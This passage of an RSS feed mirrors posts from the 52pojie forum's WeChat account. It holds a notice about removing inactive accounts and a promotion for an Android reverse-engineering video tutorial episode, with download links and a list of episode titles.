initial;">哦</span><span style="display: inline-block; text-indent: initial;">。</span></span></em></p><p><br /></p><p style="margin-bottom: 0px; color: rgb(53, 53, 53); text-align: start; letter-spacing: 0.544px; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1896511-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 04 Mar 2024 17:32:35 +0800</pubDate>
<pubDate>Mon, 04 Mar 2024 17:32:35 +0800</pubDate>
</item>
<item>
<title>【清理未活跃会员】清理2023年光棍节开放注册未活跃会员公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140115&amp;idx=1&amp;sn=db7f92a4ac85c70895044bbf2310673f&amp;chksm=bd50a0478a2729510f2f0867624e77365291d553c803ad6a5e5258cabdc125f33bd11ed5f866&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140115&amp;idx=1&amp;sn=db7f92a4ac85c70895044bbf2310673f&amp;chksm=bd50a0478a2729510f2f0867624e77365291d553c803ad6a5e5258cabdc125f33bd11ed5f866&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span></span> <span>2024-02-29 17:29</span> <span style="display: inline-block;">北京</span>
</p>

<p>3月13日十六周年开放注册即将到来，届时会提前发布公告通知。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=46dde67a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hicTxzXLj6k7G812bV22qibLsr2gbicxzlVBrosR41MfbLZDuyUxnibm0nA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 15px;"><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ee2bc56f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hZrlFUnEKOAxaXRRmQAfT32WPRF4AKdIWYKc0XOMKFICeoWrIQ7tXCA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" /></p><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;">吾爱破解论坛2023年光棍节开放注册一天四小时内共注册28290人！</span></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>为了保持论坛的活性，统计开放注册后就一直<span style="font-weight: 700;">未激活会员共756位</span></p></li><li style="margin-left: 2px;"><p>激活后发帖和回帖总计不超过2贴的会员<span style="font-weight: 700;">20946名</span></p></li><li style="margin-left: 2px;"><p>注册一个月后就再也没有登录过的会员<span style="font-weight: 700;">398名</span></p></li></ul><li style="margin-left: 2px;"><p>以上未活跃用户今日账号<span style="font-weight: 700;">全部清除</span></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">清理前我们已经再三多次提醒过</span></span>，比如：</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册的时候强制十分钟阅读须知提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7f7453fe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hCMg8w8fXDUStPceXoXxRg9pqjGxE0mddGcAZ8k8q87tt64sbOJMG5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="999" /></p><p><br /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">注册后发送激活邮件中再次提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d1904191&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hyL83XCzuFSEENEcsVqw7OJJDV9YAGfN3QI66Rs9DHOZAX1f1pQic5fw%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="1080" /></p><p><br /></p></li><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-weight: 700;"><span style="color: #ff0000;">开放注册后几天持续在论坛首页提醒</span></span><br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ec10b83&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZLZWpYtrrVmkya5YJ5ZPb0hj4j7yHrDgWWBQKv5ZXdnX7nq75zeAXm48jCjuCy4jYxX4gCqR08RUw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: 100%; height: auto;" width="1051" /></p><p><br /></p></li></ul><li style="margin-left: 2px;"><p><span style="font-weight: 700;">最后统计有效注册人数为6168名，请多登陆发帖回帖保持活跃</span>。</p></li><li style="margin-left: 2px;"><p>其他还删除了几百个马甲账号和为贩卖账号注册的已激活账号和一些违规账号，在此不再一一告知，只做简单的陈述，欢迎大家发现此类账号在投诉举报区举报。</p></li></ul><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">大家珍惜自己的账号，还要防止账号被盗，保护好账号的安全，经常登陆论坛并发帖！</h3><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>论坛众多热心会员积极举报违规行为，来协助论坛管理团队的工作，在斑竹巡查的辛勤管理下，日益恢复正常，但是灌水的，冒充别人作品的，甚至投放木马的还是层出不穷，虽然论坛有很多反病毒工程师和管理团队，但是力量还是远远不够的，这里需要大家都参与到论坛秩序维护中来，维护论坛秩序人人有责，尽自己的一份力量，帮助维护论坛秩序，发现违规的帖子可以来投诉举报区投诉举报:https://www.52pojie.cn/forum-15-1.html</p></li><li style="margin-left: 2px;"><p><span style="font-weight: 700;">站点帮助文档：有问题一般在这里都能找到！</span><br />https://www.52pojie.cn/misc.php?mod=faq</p></li></ul><p><br /><span><span style="color: Red;"><span style="font-weight: 700;">3月13日十六周年开放注册即将到来，届时会提前发布公告通知。</span></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1894998-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 29 Feb 2024 17:29:04 +0800</pubDate>
<pubDate>Thu, 29 Feb 2024 17:29:04 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-02-28 15:36</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=69140466&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZK4vurNtX1rxTQjtTg4ULaV1Q4tBeqeF0dE9fgOtO8DW4VwLAy2wHRX0NuyBGl8NbPRYlBHy46EFQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><span style="font-size: 24px;"><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></span></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p style="line-height: normal; margin-bottom: 0px;"><span style="letter-spacing: 0.544px; font-size: 16px;"><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=dbb52b99&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZK4vurNtX1rxTQjtTg4ULaVkwFdtgQUgib9Y9IRsFwgVpppBAXpIhnMqXNzMFtGx9YM8fUmK1oR4Nw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>frida实战安卓初级题与中级题</p><p>1.安卓初级题与中级题<br />2.jadx-gui<br />3.VS Code<br />4.jeb</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><br /><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><br /><p><span style="font-size: 15px;">阿里云PS：</span></p><br /><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><br /><p><span style="font-size: 15px;">哔哩哔哩：</span></p><br /><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><br /><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><br /><p><span style="color: #576b95;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><br /><p><span style="color: #576b95;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68);" target="_blank"></a><br /></p><br /><p style="margin-bottom: 15px;">dex起步探索</p><p><br /></p><br /><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><br /><p><span>https://www.52pojie.cn/thread-1892127-1-1.html</span></p><br /><p><span><br /></span></p><br /><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1NW421P7CF">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 28 Feb 2024 15:35:53 +0800</pubDate>
<pubDate>Wed, 28 Feb 2024 15:35:53 +0800</pubDate>
</item>

</channel>
</rss>